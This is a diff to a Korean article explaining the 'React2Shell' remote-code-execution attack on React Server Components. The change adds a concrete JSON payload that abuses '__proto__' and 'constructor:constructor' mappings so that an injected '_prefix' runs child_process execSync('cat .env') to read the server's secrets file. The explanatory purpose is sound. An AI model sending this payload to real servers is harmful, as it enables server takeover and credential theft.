@@ -42,26 +42,34 @@
 
 ## 02. React2Shell 공격 메커니즘
 
-공격은 크게 **폭탄 설치(Payload 전송) → 점화(Prototype Pollution) → 폭발(RCE 실행)**의 3단계로 이루어집니다.
+공격은 크게 **폭탄 설치(Payload 전송) → 점화(역직렬화) → 폭발(RCE 실행)**의 3단계로 이루어집니다.
 
-### 1) 폭탄 설치 (Bomb Installation)
+### 1) 폭탄 설치 
 
-공격자는 `multipart/form-data` 요청을 통해 조작된 JSON 데이터를 서버로 전송합니다. 이때 일반적인 데이터가 아닌 **Promise 객체처럼 위장한 가짜 청크(Fake Chunk)**를 포함시킵니다.
+공격자는 `Next-Action`, `multipart/form-data` 헤더를 포함한 요청을 통해 JSON 데이터를 서버로 전송합니다. 이때 일반적인 데이터가 아닌 **Promise 객체처럼 위장한 가짜 청크(Fake Chunk)**를 포함시킵니다.
 
-### 2) 점화 (Ignition)
+### 2) 점화
 
-서버가 데이터를 해석(Parsing)하는 과정에서 **Prototype Pollution**이 발생합니다.
+1. 공격자가 보낸 가짜 청크의 `then`에 `Chunk.prototype.then`이 매핑됩니다.
 
 ```javascript
 // 공격자가 전송한 페이로드 예시
 {
-  "$1": "__proto__",
-  "then": { ... } // 객체의 프로토타입을 오염시켜 Promise처럼 동작하게 유도
+	"then" : "$1:__proto__:then",
+	"status" : "resolved_model",
+	"reason" : -1,
+	"value" : "{\"then\":\"$B1337\"}",
+	"_response" : {
+		"_prefix":"process.mainModule.require('child_process').execSync('cat .env'); //",
+		"_formData":{"get":"$1:constructor:constructor"}
+	}
 }
-
 ```
+2. Blob 데이터를 역직렬화하는 과정에서 `_prefix`에 담긴 악성 코드가 `Function`의 인자로 들어갑니다.
+3. 서버가 thenable을 실행하여 `Function`이 실행됩니다. 
 
-### 3) 폭발 (Detonation)
+
+### 3) 폭발
 
 서버는 오염된 객체를 처리하며 공격자가 주입한 악성 함수(Blob)를 실행하게 되고, 결과적으로 서버의 쉘(Shell) 권한이 탈취됩니다.
 
